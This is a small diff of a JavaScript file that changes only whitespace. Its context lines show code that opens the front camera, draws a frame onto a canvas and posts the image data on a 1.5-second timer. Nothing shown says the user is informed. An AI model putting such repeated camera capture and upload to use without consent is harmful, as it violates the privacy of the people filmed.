@@ -39,7 +39,7 @@ const errorMsgElement = document.querySelector('span#errorMsg');
 const constraints = {
   audio: false,
   video: {
-
+    
     facingMode: "user"
   }
 };
@@ -65,7 +65,7 @@ var context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
-
+  
 
 }
 
